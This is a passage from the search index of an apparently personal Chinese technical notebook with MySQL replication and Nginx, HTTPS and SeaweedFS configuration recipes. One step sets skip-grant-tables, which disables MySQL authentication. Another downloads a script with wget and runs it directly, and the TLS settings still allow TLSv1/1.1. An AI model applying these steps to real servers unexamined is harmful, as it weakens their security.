<p>\u4fee\u6539my.cnf\u5728<code>[mysqld]</code>\u589e\u52a0<code>skip-grant-tables</code> \u6ce8\u610f\u590d\u6570\uff0c\u6765\u4fdd\u8bc1slave\u53ef\u4ee5\u8fde\u4e0a\u8fdb\u884c\u64cd\u4f5c</p> <p>\u7136\u540e\u6267\u884csql\u8bed\u53e5<code>STOP SLAVE;</code> \u518d\u6267\u884c\u4e0a\u8ff0\u642c\u8fd0\u6570\u636e\u5e93\u7684\u64cd\u4f5c\uff0c\u5bfc\u5165\u5b8c\u6210\u540e<code>START SLAVE</code></p> <p>\u4f7f\u7528<code>show slave status;</code>\u67e5\u770bslave\u72b6\u6001</p> <p>\u53e6\u5916\uff0c\u914d\u5408autossh\u548cssh\u7684\u7aef\u53e3\u8f6c\u53d1\u53ef\u4ee5\u907f\u514d\u5c06mysql\u7aef\u53e3\u66b4\u9732\u5728\u5916\uff1a</p> <pre><code>autossh -M 0 -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -L 172.17.0.1:3306:127.0.0.1:3306 user@12.34.56.789\n</code></pre> <p>\u76f8\u5e94\u5730\uff0cslave\u914d\u7f6e\u7684master\u5730\u5740\u6539\u4e3a172.17.0.1</p>"},{"location":"MySQL/#mysql","title":"\u4e3a\u4ec0\u4e48MySQL\u8868\u5fc5\u987b\u8981\u6709\u4e3b\u952e","text":"<p>Learned from: https://federico-razzoli.com/why-mysql-tables-need-a-primary-key</p> <p>InnoDB\u4e2d\u975e\u4e3b\u952e\u7684\u7d22\u5f15\u662f\u989d\u5916\u5b58\u50a8\u7684\uff0c\u4f7f\u7528\u7d22\u5f15\u67e5\u8be2\u5148\u67e5\u5230\u4e3b\u952e\uff0c\u518d\u7528\u4e3b\u952e\u67e5\u6570\u636e\u2014\u2014\u6ca1\u6709\u4e3b\u952e\u7684\u67e5\u8be2\u4f1a\u6162\u4e00\u4e9b</p> <p>\u6ca1\u6709\u4e3b\u952e\u4e5f\u6ca1\u6709\u9690\u5f0f\u4e3b\u952e\uff08\u521b\u5efa\u8868\u7684\u65f6\u5019\u6307\u5b9a\u7684NOT NULL UNIQUE\u5217\uff09\u4f1a\u81ea\u52a8\u4f7f\u7528\u9012\u589e\u7684row id\u4f5c\u4e3a\u4e3b\u952e\uff0c\u4f46\u9012\u589e\u9700\u8981\u5168\u5c40\u9501<code>dict_sys-&gt;mutex</code>\u2014\u2014\u591a\u4e2a\u8868\u540c\u65f6\u63d2\u5165\u65f6\u6027\u80fd\u4e0b\u964d</p> <p>\u5728binlog\u4e2d\u5220\u9664\u64cd\u4f5c\u6709\u4e3b\u952e\u53ea\u9700\u8981\u8bb0\u5f55\u4e3b\u952e\uff0c\u6ca1\u6709\u4e3b\u952e\u9700\u8981\u8bb0\u5f55\u6240\u6709\u5185\u5bb9\u2014\u2014binlog\u66f4\u5927</p> <p>\u4ece\u673a\u6267\u884cbinlog\u4e2d\u7684delete\u64cd\u4f5c\uff0c\u6bcf\u6b21\u64cd\u4f5c\u90fd\u9700\u8981\u626b\u63cf\u5168\u8868\u2014\u2014\u6027\u80fd\u663e\u8457\u4e0b\u964d</p> <p>\u96c6\u7fa4\u5982Galera\u9700\u8981\u7b49\u5f85\u6240\u6709\u8282\u70b9commit\u624d\u4f1a\u7ed9\u5ba2\u6237\u7aef\u8fd4\u56de\u6210\u529f\u2014\u2014\u7528\u6237\u611f\u53d7\u5230\u5f88\u9ad8\u7684\u5ef6\u8fdf</p>"},{"location":"Nginx/","title":"Nginx","text":"<p>\u8bb0\u5f55\u7528\u5230\u7684\u914d\u7f6e\uff0c\u8bf4\u4e0d\u5b9a\u4f60\u4e5f\u80fd\u9047\u5230\u8fd9\u4e9b\u7279\u6b8a\u9700\u6c42\u5462~</p>"},{"location":"Nginx/#nginx_1","title":"Nginx\u601d\u8003\u9898","text":"<p>\u8bf7\u4ee5\u6279\u5224\u7684\u773c\u5149\u9605\u8bfb\u4ee5\u4e0b\u94fe\u63a5\u6216\u8005\u81ea\u884cgoogle\uff0c\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898\uff1a</p> <p>http://www.nginx.cn/591.html</p> <ol> <li> <p>nginx.conf\u5728\u4f60Linux\u7684\u4ec0\u4e48\u76ee\u5f55\u4e0b\uff1f\u7528\u4ec0\u4e48\u547d\u4ee4\u77e5\u9053\u7684\uff1f\u4fee\u6539\u914d\u7f6e\u540e\u901a\u8fc7\u4ec0\u4e48\u547d\u4ee4\u91cd\u65b0\u8f7d\u5165\u914d\u7f6e\uff1f</p> </li> <li> <p>nginx.conf\u5206\u4e3a\u51e0\u4e2a\u90e8\u5206\uff1f\u6211\u4eec\u9700\u8981\u5173\u6ce8\u7684\u662f\u54ea\u4e2a\uff1f</p> </li> <li> <p>nginx.conf\u4e2d\u600e\u4e48\u8868\u793a\u6ce8\u91ca\u884c\uff1f\u662f\u5426\u7559\u610f\u5230include\u7684\u884c\u8f7d\u5165\u4e86\u989d\u5916\u7684\u914d\u7f6e\u6587\u4ef6\uff1f</p> </li> <li> <p>\u5982\u4f55\u589e\u52a0\u4e00\u4e2a\u865a\u62df\u4e3b\u673a\uff0c\u6839\u636e\u57df\u540d\u6765\u533a\u5206\u8bbf\u95ee\u4e0d\u540c\u7684\u7f51\u7ad9\uff1f\u8bbf\u95ee\u8005\u76f4\u63a5\u8bbf\u95eeIP\u6216\u8005\u9519\u8bef\u7684\u57df\u540d\u4f1a\u5339\u914d\u5230\u9ed8\u8ba4\u7f51\u7ad9\uff0c\u600e\u4e48\u914d\u7f6e\u9ed8\u8ba4\u7f51\u7ad9\uff1f</p> </li> </ol> <p>\u8fd9\u4e9b\u662f\u66f4\u4e3a\u8fdb\u9636/\u53d1\u6563\u7684\u95ee\u9898\uff1a</p> <ol> <li> <p>\u9759\u6001\u5185\u5bb9\uff1aroot\u4e0ealias\u6709\u4f55\u533a\u522b\uff1f\u8bbf\u95ee403\u4e86\u600e\u4e48\u529e\uff1f</p> </li> <li> <p>\u52a8\u6001\u5185\u5bb9/\u53cd\u5411\u4ee3\u7406\uff1a\u5982\u4f55\u505a\u8d1f\u8f7d\u5747\u8861\u3001\u6587\u672c\u66ff\u6362\uff1f</p> </li> <li> <p>\u5168\u7ad9https\u548cHTTP/2.0\u600e\u4e48\u914d\u7f6e\uff1f</p> </li> <li> <p>Nginx\u662f\u5426\u6709\u5fc5\u8981\u4f5c\u4e3a\u4e00\u4e2aDocker\u5bb9\u5668\u8fd0\u884c\uff1fCentOS\u4e0bNginx\u955c\u50cf\u5f88\u5927\uff0c\u600e\u4e48\u51cf\u5c0f\u955c\u50cf\u5927\u5c0f\uff1f</p> </li> <li> <p>Nginx\u7684worker\u8fdb\u7a0b\u4e00\u822c\u4e0d\u662froot\u6743\u9650\u7684\uff0c\u90a3\u662f\u600e\u4e48\u76d1\u542c\u523080\u7aef\u53e3\u7684\uff1f</p> </li> <li> <p>Nginx\u5728\u5904\u7406\u9ad8\u5e76\u53d1\u7684\u65f6\u5019\u53c2\u6570\u5982\u4f55\u8c03\u4f18\uff1f</p> </li> <li> <p>\u5982\u4f55\u5728Nginx\u5c42\u9762\u62e6\u622asql\u6ce8\u5165\u3001\u5bc6\u7801\u7206\u7834\u7b49\u5b89\u5168\u98ce\u9669\uff1fVeryNginx</p> </li> </ol>"},{"location":"Nginx/#post","title":"\u666e\u901a\u8d44\u6e90\u5141\u8bb8POST","text":"<pre><code>error_page 405 =200 @405;\n</code></pre>"},{"location":"Nginx/#php","title":"\u4e0d\u5e26\u540e\u7f00\u7684\u6587\u4ef6\u5f53\u6210php\u6267\u884c","text":"<p>\u8fd9\u91cc\u7684\u601d\u8def\u662f\u7528\u53cd\u5411\u4ee3\u7406\u7684\u65b9\u5f0f\u7b80\u5355\u5b9e\u73b0</p> <pre><code>location /path/something {\nproxy_pass http://yourdomain/path/something.php;\nproxy_method GET;\n}\n</code></pre> <p>\u987a\u5e26\u62d2\u7edd\u6389\u5bf9php\u540e\u7f00\u7684\u731c\u6d4b\uff1a</p> <pre><code>location = /path/something.php {\n    if ($remote_addr != '\u670d\u52a1\u5668\u81ea\u8eabIP') {\n        return 404;\n}\n    include fastcgi.conf;\n}\n</code></pre>"},{"location":"Nginx/#httphttps","title":"http\u8df3\u8f6c\u5230https","text":"<pre><code>location /{\nrewrite ^ https://$host$request_uri? permanent;\n}\n</code></pre>"},{"location":"Nginx/#lets-encrypthttps","title":"\u83b7\u5f97Let\u2019s encrypt\u514d\u8d39https\u8bc1\u4e66","text":"<p>\u4e3a\u7b80\u5316\u64cd\u4f5c\uff0c\u6211\u5199\u4e86\u4e00\u4e2a\u66f4\u52a0\u65b9\u4fbf\u7684getcert.py</p>"},{"location":"Nginx/#_1","title":"\u4f7f\u7528\u65b9\u6cd5\uff1a","text":""},{"location":"Nginx/#_2","title":"\u7b2c\u4e00\u6b65\uff1a","text":"<p>\u914d\u7f6e\u76f8\u5e94\u7f51\u7ad9\u7684nginx conf\u4e2d\u7684server\u91cc\u9762\uff0c\u52a0\u5165\u8fd9\u4e2a\uff1a</p> <pre><code>    location /.well-known/acme-challenge {\n        alias \u4fdd\u5b58\u5bc6\u94a5\u7684\u76ee\u5f55;\n        try_files $uri =404;\n    }\n</code></pre> <p>\u8bb0\u5f97\u8fd0\u884c\u540e <code>nginx -s reload</code></p>"},{"location":"Nginx/#getcertpy","title":"\u7b2c\u4e8c\u6b65\uff0c\u8fd0\u884c\u6211\u7684getcert.py\uff08\u521b\u5efa\u79c1\u94a5\u5e76\u63d0\u4ea4\u7533\u8bf7\uff09\uff1a","text":"<pre><code>pushd \u4e0a\u8ff0\u4fdd\u5b58\u5bc6\u94a5\u7684\u76ee\u5f55\nwget https://raw.githubusercontent.com/zjuchenyuan/notebook/master/code/getcert.py\n./getcert.py \u6587\u4ef6\u540d\u79f0 \u8be5\u8bc1\u4e66\u5305\u542b\u7684\u57df\u540d\u5217\u8868\n</code></pre> <p>\u4f8b\u5982\u8fd9\u6837\u5c31\u80fd\u83b7\u5f97\u4e00\u5f20\u6db5\u76d6zjusec.com\u4e09\u4e2a\u5b50\u57df\u540d\u7684\u8bc1\u4e66\uff1a<code>./getcert.py zjusec zjusec.com,www.zjusec.com,web.zjusec.com</code></p> <p>\u5177\u4f53\u6765\u8bf4\uff0c\u8fd9\u4e2a\u811a\u672c\u4f1a\u81ea\u52a8\u4e0b\u8f7d\u9700\u8981\u7684acme_tiny.py\u548cLet\u2019s Encrypt\u7684\u4e2d\u95f4\u8bc1\u4e66\uff0c\u8c03\u7528openssl\u521b\u5efa\u8d26\u53f7\u79c1\u94a5\u548c\u7ad9\u70b9\u79c1\u94a5\uff0c\u6700\u7ec8\u4ea7\u751f \u540d\u79f0.crt \u540d\u79f0.key\u3002</p> <p></p>"},{"location":"Nginx/#acmesh","title":"\u4f7f\u7528acme.sh\u83b7\u5f97\u6cdb\u57df\u540d\u8bc1\u4e66","text":"<p>\u6cdb\u57df\u540d\u89e3\u6790\u9700\u8981\u4f7f\u7528DNS\u9a8c\u8bc1\uff0c\u5c31\u9700\u8981\u4f7f\u7528DNS\u670d\u52a1\u7684API\uff0c\u5373\u4f7f\u6ca1\u6709API\u53ea\u8981\u914d\u7f6e\u4e00\u6761CNAME\u6307\u5411\u4e00\u4e2a\u6709DNS API\u7684\u57df\u540d\u5373\u53ef</p> <p>\u9996\u5148\u83b7\u5f97acme.sh</p> <p>git clone https://github.com/Neilpang/acme.sh</p> <p>\u7136\u540e\u62ff\u5230cloudflare\u7684API Key\uff0c\u6258\u7ba1b.com</p> <p>\u9700\u8981\u62ff\u5230\u80fd\u7528\u4e8ea.com\u548c*.a.com\u7684\u8bc1\u4e66\uff0c\u5148\u914d\u7f6eCNAME\uff08\u53c2\u8003\uff1ahttps://github.com/Neilpang/acme.sh/wiki/DNS-alias-mode\uff09</p> <p>_acme-challenge.a.com   =&gt;   _acme-challenge.b.com</p> <p>\u6267\u884c\u547d\u4ee4\u54af\uff1a</p> <pre><code>CF_Key=xxx CF_Email=xxx@example.com /root/acme.sh/acme.sh --issue --dns dns_cf -d '*.a.com' --challenge-alias b.com -d a.com --dnssleep 10 --fullchain-file /root/acom.crt --key-file /root/acom.key -f\n</code></pre> <p>\u89e3\u91ca\uff1a\u524d\u9762\u4e24\u4e2a\u662f\u914d\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u4f7f\u7528cloudflare\u6240\u4ee5\u6307\u5b9a\u2013dns dns_cf\uff0c\u7136\u540e-d \u2026 \u2013challenge-alias \u2026 -d \u2026 \u6307\u5b9a\u57df\u540d\u548c\u9a8c\u8bc1\u7528\u7684\u57df\u540d\uff0c\u2013dnssleep 10\u7b49\u5f8510\u79d2DNS\u751f\u6548\uff08\u9ed8\u8ba4120\u79d2\u6ca1\u5fc5\u8981\uff09\uff0c\u2013fullchain-file\u548c\u2013key-file \u6307\u5b9a\u751f\u6210\u540e\u628a\u8bc1\u4e66\u6587\u4ef6\u548c\u5bc6\u94a5\u6587\u4ef6\u62f7\u8d1d\u5230\u54ea</p>"},{"location":"Nginx/#https","title":"\u914d\u7f6e\u5b89\u5168\u7684https","text":"<p>\u6b64\u5904\u53c2\u8003https://z.codes/ssl-lab-a-plus-configuration-for-nginx/</p> <p>\u9996\u5148\u4ecePPA\u5b89\u88c5nginx, \u8fd9\u6837\u53ef\u4ee5\u4fdd\u8bc1\u6700\u65b0\u7248</p> <pre><code>add-apt-repository ppa:nginx/stable\napt update\napt install nginx\n</code></pre> <p>\u521b\u5efaDH\u968f\u673a\u8d28\u6570\uff1a</p> <pre><code>openssl dhparam -out /etc/ssl/dhparams.pem 2048\n</code></pre> <p>\u521b\u5efa/etc/nginx/https.conf\uff1a</p> <pre><code>listen 443 ssl http2;\nadd_header Strict-Transport-Security \"max-age=31536000\" always;\nadd_header Upgrade-Insecure-Requests \"1\";\nadd_header Content-Security-Policy \"upgrade-insecure-requests\";\nssl_dhparam /etc/ssl/dhparams.pem;\nssl_stapling on;\nssl_stapling_verify on;\nresolver 8.8.8.8 8.8.4.4 114.114.114.114 valid=60s;\nresolver_timeout 2s;\nssl_protocols TLSv1 TLSv1.1 TLSv1.2;\nssl_ciphers 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:AES:CAMELLIA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDH-DSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA';\nssl_session_cache shared:SSL:10m;\nssl_session_timeout 24h;\nssl_buffer_size 1400;\nssl_prefer_server_ciphers  on;\nkeepalive_timeout 600s;\nlocation ~* /\\.(?!well-known\\/) {\ndeny all;\n}\nlocation ~* (?:\\.(?:bak|conf|dist|fla|in[ci]|log|psd|sh|sql|sw[op])|~)$ {\ndeny all;\n}\ninclude mime.types;\n</code></pre> <p>\u4e3a\u9700\u8981\u542f\u7528https\u7684\u7ad9\u70b9\uff0c\u5728/etc/nginx/sites-enabled/\u4e2d\u5199\u5165conf\u6587\u4ef6</p> <pre><code>server {\n    listen 443;\nserver_name \u57df\u540d1 \u57df\u540d2;\naccess_log /tmp/access.log;\nerror_log /tmp/error.log;\nssl_certificate \u5bc6\u94a5\u76ee\u5f55/\u540d\u79f0.crt;\nssl_certificate_key \u5bc6\u94a5\u76ee\u5f55/\u540d\u79f0.key;\ninclude https.conf\n\u5176\u4ed6\u914d\u7f6e\u3002\u3002\u3002\n}\n</code></pre>"},{"location":"Nginx/#js","title":"\u53cd\u5411\u4ee3\u7406\u4e4b\u66ff\u6362\u7f51\u9875\u3001JS\u4e2d\u7684\u6587\u672c","text":"<p>\u4f7f\u7528\u6a21\u5757ngx_http_substitutions_filter_module\uff0c\u89c1Github: https://github.com/yaoweibin/ngx_http_substitutions_filter_module</p> <p>\u9700\u8981\u91cd\u65b0\u7f16\u8bd1nginx\uff0cTip: <code>nginx -V</code>\u547d\u4ee4\u53ef\u4ee5\u663e\u793a\u5f53\u524d\u7248\u672c\u7684nginx\u7684\u7f16\u8bd1\u53c2\u6570</p> <p>\u7f16\u8bd1\u540e\u5c31\u53ef\u4ee5\u7528\u5566\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1a\u5fae\u4fe1\u7684\u516c\u4f17\u53f7\u6587\u7ae0\u9875\u9762\u4e3a\u4e86\u8282\u7701\u7528\u6237\u6d41\u91cf\uff0c\u56fe\u7247\u662f\u628a\u9875\u9762\u6eda\u52a8\u81f3\u6240\u5728\u4f4d\u7f6e\u624d\u52a0\u8f7d\u7684\uff0c\u4ee3\u7801\u4e0a\u7684\u5dee\u5f02\u5c31\u662fimg\u6807\u7b7e\u672c\u5e94\u662fsrc\u7684\u6539\u6210\u4e86data-src\uff0c\u8fd9\u91cc\u6211\u4eec\u8981\u505a\u4e00\u4e2a\u5fae\u4fe1\u7684\u53cd\u5411\u4ee3\u7406\u7f51\u7ad9\uff0c\u628adata-src\u66ff\u6362\u6210src\uff0c\u5219\u53ef\u4ee5\u76f4\u63a5\u52a0\u8f7d\u6240\u6709\u56fe\u7247\uff08\u5514\u3002\u3002\u3002\u5176\u5b9e\u8fd8\u4e0d\u591f\uff0c\u8fd8\u9700\u8981\u8003\u8651\u9632\u76d7\u94fe\u7684\u95ee\u9898\uff09\uff1b\u5e76\u4e14\u8bbe\u7f6eMIME\u7c7b\u578b\u5305\u542bJavascript</p> <pre><code>        subs_filter \u9700\u8981\u66ff\u6362\u6389\u7684\u5185\u5bb9 \u66ff\u6362\u540e\u7684\u6587\u672c;\n        subs_filter data-src src;\n        subs_filter_types application/x-javascript text/javascript appliation/x-javascript;\n</code></pre>"},{"location":"Nginx/#git","title":"\u7981\u6b62git\u76ee\u5f55\u8bbf\u95ee","text":"<p>\u5728server\u5757\u4e2d\u6dfb\u52a0\uff1a</p> <pre><code>location ~ /\\. {\n    return 404;\n}\n</code></pre> <p>\u76f8\u5e94\u7684Apache\u53ef\u4ee5\u5728httpd.conf\u4e2d\u6dfb\u52a0\uff1a</p> <pre><code>RedirectMatch 404 /\\.git\n</code></pre>"},{"location":"Nginx/#rootalias","title":"root\u4e0ealias\u7684\u533a\u522b","text":"<p>From: http://stackoverflow.com/questions/10631933/nginx-static-file-serving-confusion-with-root-alias</p> <p>\u4e00\u53e5\u8bdd\u6982\u62ec\uff0croot\u5bf9\u5e94\u7684\u76ee\u5f55\u4f1a\u52a0\u4e0alocation\u90e8\u5206\u53bb\u627e\u6587\u4ef6\uff0c\u800calias\u5219\u4e0d\u4f1a</p> <pre><code>        location /static/ {\nroot /var/www/app/static/;\nautoindex off;\n}\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u8fd9\u4e48\u5199\uff0c\u90a3\u4e48\u8bbf\u95eestatic\u76ee\u5f55\u4e0b\u7684a.jpg\u5c31\u4f1a\u53bb\u627e/var/www/app/static/static\u76ee\u5f55\u4e0b\u7684a.jpg\uff0c\u5982\u679c\u6ca1\u6709\u8fd9\u4e2astatic/static\u5c31\u4f1a404</p> <p>\u89e3\u51b3\u65b9\u6cd5\u6709\u4e24\u79cd\uff1a</p> <p>\u5982\u679clocation\u4e2d\u7684static\u5c31\u662f\u771f\u5b9e\u76ee\u5f55\uff0croot\u4e2d\u5c31\u4e0d\u8981\u5199static\u4e86</p> <pre><code>        location /static/ {\nroot /var/www/app/;\nautoindex off;\n}\n</code></pre> <p>\u6216\u8005\u7528alias\u5c31\u4e0d\u4f1a\u518d\u52a0\u4e0alocation\u7684\u90e8\u5206\uff1a</p> <pre><code>        location /static/ {\nalias /var/www/app/static/;\nautoindex off;\n}\n</code></pre>"},{"location":"Nginx/#bash-on-win10nginx","title":"\u5728bash on win10\u4e0a\u4f7f\u7528Nginx","text":"<p>\u4e0eLinux\u4e2d\u5b89\u88c5\u7c7b\u4f3c\uff0c\u53ea\u8981<code>apt-get install nginx</code>\u5373\u53ef\uff0c\u4f46\u53ef\u80fd\u4f1a\u53d1\u73b0nginx\u5e76\u4e0d\u6b63\u5e38\u5de5\u4f5c\uff0c\u65e5\u5fd7\u4e2d\u662f\u8fd9\u6837\u7684\uff1a</p> <pre><code>[alert] 79#0: ioctl(FIOASYNC) failed while spawning \"worker process\" (22: Invalid argument)\n</code></pre> <p>\u89e3\u51b3\u65b9\u6848\uff1a\u5728/etc/nginx/nginx.conf\u4e2d\u6dfb\u52a0\u4e00\u884c\uff1a</p> <pre><code>master_process off;\n</code></pre>"},{"location":"Nginx/#ip","title":"\u4f7f\u4e0a\u4e00\u7ea7\u670d\u52a1\u77e5\u9053\u7528\u6237IP","text":"<pre><code>proxy_set_header realip $remote_addr;\n</code></pre> <p>\u8fd9\u6837\u8bbe\u7f6e\u540e\uff0cNginx\u53cd\u5411\u4ee3\u7406\u4e0a\u4e00\u7ea7\u670d\u52a1\u4f1a\u52a0\u4e0arealip\u8fd9\u4e2a\u5934\uff0c\u4ece\u800c\u4f20\u9012\u7528\u6237\u771f\u5b9e\u7684IP\uff08\u5982\u679c\u662f\u4ee3\u7406\u5219\u662f\u4ee3\u7406\u7684IP\uff09</p>"},{"location":"Nginx/#nginx_2","title":"Nginx\u5141\u8bb8\u5217\u76ee\u5f55","text":"<p>\u52a0\u4e0a<code>autoindex on</code>\u5373\u53ef\uff0c\u540e\u4e24\u9879\u662f\u4e3a\u4e86 \u663e\u793a\u670d\u52a1\u5668\u65f6\u95f4\u800c\u4e0d\u662fGMT\u65f6\u95f4 \u4ee5\u53ca \u4ee5kB,MB,GB\u4e3a\u5355\u4f4d\u663e\u793a\u5927\u5c0f\u800c\u4e0d\u662f\u786e\u5207\u7684\u5b57\u8282\u6570</p> <pre><code>location / {\n    autoindex on;\n    autoindex_localtime on;\n    autoindex_exact_size off;\n}\n</code></pre>"},{"location":"Nginx/#seaweedfs","title":"\u5b89\u5168\u5730\u4f7f\u7528SeaweedFS\u4f5c\u4e3a\u56fe\u7247\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668","text":"<p>\u60f3\u57fa\u4e8eseaweedfs\u5b9e\u73b0\u4e00\u4e2a\u53cd\u5411\u4ee3\u7406\u7684\u7f13\u5b58\u670d\u52a1\u5668\uff0cNginx\u5148\u8bf7\u6c42A\u670d\u52a1\u5668(weedfs filer)\uff0c\u5982\u679c\u8fd8\u6ca1\u6709\u5b58\u4e0b\u8fd9\u5f20\u56fe\u7247(\u8fd4\u56de404)\uff0c\u5207\u81f3B\u670d\u52a1\u5668(Python flask)\u53bb\u722c\u53d6\u56fe\u7247\u5e76\u4f20\u81f3weedfs\u5b58\u50a8</p> <p>seaweedfs\u7684filer\u63d0\u4f9b\u4e86\u6309\u81ea\u5df1\u6307\u5b9a\u7684\u8def\u5f84\u4e0a\u4f20\u4e0b\u8f7d\u529f\u80fd\uff08\u5bf9\u8c61\u5b58\u50a8\uff09\uff0c\u5c31\u4e0d\u9700\u8981\u518d\u81ea\u5df1\u8003\u8651\u600e\u4e48\u5b58\u50a8path\u4e0efid\u7684\u5bf9\u5e94\u5173\u7cfb\u4e86\uff0c\u76f4\u63a5\u6309\u722c\u53d6\u6e90\u7684\u8def\u5f84\u5b58\u50a8\u5373\u53ef</p> <p>\u5b9e\u73b0\uff1a</p>"},{"location":"Nginx/#nginx_3","title":"Nginx\u914d\u7f6e","text":""},{"location":"Nginx/#httpupstream","title":"\u5728http\u6bb5\u4e2d\u6dfb\u52a0upstream","text":"<p>\u6ce8\u610f\u628aB\u670d\u52a1\u5668\u8bbe\u7f6e\u4e3abackup \u4e0d\u8981\u53c2\u4e0e\u9ed8\u8ba4\u8d1f\u8f7d\u5747\u8861</p> <pre><code>upstream up {\nserver weedfs:8888;\nserver 127.0.0.1:80 backup;\n}\n</code></pre>"},{"location":"Nginx/#server","title":"server\u6bb5\u914d\u7f6e","text":"<p>\u6211\u5e0c\u671b\u8bbf\u95ee<code>/images/hhh.jpg</code>\u5b9e\u9645\u8bbf\u95ee<code>http://weedfs:8888/my_images/hhh.jpg</code></p> <p>\u5173\u952e\u5c31\u662f<code>proxy_next_upstream</code></p> <pre><code>location /images/ {\nrewrite ^/images(/.*)$ /my_images$1 break;\nproxy_pass http://up;\nproxy_next_upstream http_404;\nproxy_hide_header Content-Type;\nadd_header Content-Type image/jpeg;\nlimit_except GET {\ndeny all;\n}\n}\n</code></pre> <p>\u5728seaweedfs\u8fd4\u56de404\u7684\u65f6\u5019\u4f1a\u7ee7\u7eed\u8bf7\u6c42<code>http://127.0.0.1/my_images/hhh.jpg</code></p> <p>\u8fd9\u79cdrewrite\u662f\u4e0d\u4f1a\u4fee\u6539POST\u7684url\u7684\u3002\u3002\u3002\u5c31\u5f88\u8ff7\uff0c\u53e6\u5916\u5141\u8bb8\u7528\u6237POST\u4e0a\u4f20\u4e5f\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u8fd9\u91cc\u5c31\u76f4\u63a5\u7981\u6b62\u4e86\u975eGET\u65b9\u6cd5</p>"},{"location":"Nginx/#header","title":"\u4fee\u6539\u540e\u7aef\u7279\u5b9aheader","text":"<p>\u8fd9\u91cc\u7528\u7684\u662f\u5148\u5220\u9664<code>proxy_hide_header</code>\u518d\u6dfb\u52a0<code>add_header</code></p>"},{"location":"Nginx/#nginxseaweedfs","title":"\u6211\u8fd8\u662f\u60f3\u8ba9nginx\u4e5f\u80fd\u652f\u6301\u7ed9seaweedfs\u4e0a\u4f20\u6587\u4ef6","text":"<p>\u4e0d\u8981\u6b7b\u78d5\u4e00\u4e2alocation\u561b\uff0c\u518d\u914d\u7f6e\u4e2a\u5457\uff1a</p> <pre><code>location /upload_images/ {\nrewrite ^/upload_images(/.*)$ $1 break;\nresolver 127.0.0.11 valid=10s;\nproxy_pass http://weedfs:8888/my_images$1;\nallow 127.0.0.0/8;\ndeny all;\n}\n</code></pre> <p>\u8fd9\u6837\u914d\u7f6e\u7684\u6548\u679c\u662fPOST <code>/upload_images/</code>\u76f8\u5f53\u4e8e\u5728POST <code>http://weedfs:8888/my_images/</code></p> <p>\u4e0e\u524d\u8ff0\u7684GET\u914d\u7f6e\u662f\u76f8\u540c\u7684\u540e\u7aef\u8def\u5f84\uff0c\u4e0a\u4f20\u7684\u6587\u4ef6\uff08\u5982<code>/123.jpg</code>\uff09\u5c31\u4f20\u5230\u4e86weedfs\u7684<code>http://weedfs:8888/my_images/123.jpg</code>\u80fd\u901a\u8fc7<code>/images/123.jpg</code>\u8bbf\u95ee\u5230</p>"},{"location":"Nginx/#proxy_passdns","title":"\u914d\u7f6eproxy_pass\u4f7f\u7528\u7684DNS\u670d\u52a1\u5668","text":"<p>\u7531\u4e8e\u8fd9\u4e2anginx\u662f\u5728Docker\u5bb9\u5668\u91cc\u9762\u7684\uff0cweedfs\u662f\u53e6\u4e00\u4e2a\u5bb9\u5668\u52a0\u5165\u7f51\u7edc\u7684\u65f6\u5019\u6307\u5b9a\u7684\u522b\u540d\uff0c\u6240\u4ee5\u6ce8\u610f\u4e0a\u9762\u7684resolver\u8bbe\u7f6e\u4e3a\u4e0e\u5bb9\u5668/etc/resolv.conf\u4e00\u81f4\u7684<code>127.0.0.11</code></p> <p>\u7ecf\u8fc7\u6211\u6d4b\u8bd5\uff0c\u8fd9\u4e2a\u914d\u7f6e\u5fc5\u987b\u5728location\u4e2d\u624d\u6709\u6548\uff0c\u653e\u5230http\u91cc\u9762\u6ca1\u7528</p>"},{"location":"Nginx/#docker-seaweedfs","title":"Docker \u6211\u4f7f\u7528\u7684seaweedfs\u542f\u52a8\u547d\u4ee4","text":""},{"location":"Nginx/#filer","title":"\u7f16\u8bd1\u955c\u50cf \u907f\u514d\u4e22\u5931filer\u6570\u636e","text":"<p>\u9996\u5148\u9700\u8981\u81ea\u5df1\u7f16\u8bd1\u4e00\u4e2aDocker\u955c\u50cf\uff0c\u9ed8\u8ba4\u7684\u955c\u50cf\u4f1a\u628afiler\u7684leveldb\u6570\u636e\u5b58\u50a8\u5728\u6839\u76ee\u5f55\uff0c\u5220\u9664\u5bb9\u5668\u5c31\u4f1a\u4e22\u5931\u8fd9\u90e8\u5206\u6570\u636e</p> <p>\u53c2\u89c1\uff1ahttps://github.com/chrislusf/seaweedfs/blob/master/docker/</p> <p><code>filer.toml</code>:</p> <pre><code>[leveldb]\nenabled = true\ndir = \"/data/filer/\"\n</code></pre> <p><code>Dockerfile</code>:</p> <pre><code>FROM chrislusf/seaweedfs\nCOPY filer.toml /etc/seaweedfs/filer.toml\n</code></pre>"},{"location":"Nginx/#_3","title":"\u542f\u52a8\u547d\u4ee4","text":"<pre><code>docker run -dit --name weedfs --restart=always --user nobody -v /data/weedfs:/data myweed -log_dir=/data/logs/ server -dir /data -filer=true -filer.disableDirListing -volume.publicUrl=weedfs.py3.io\n\ndocker network connect useweed weedfs --alias weedfs\n</code></pre> 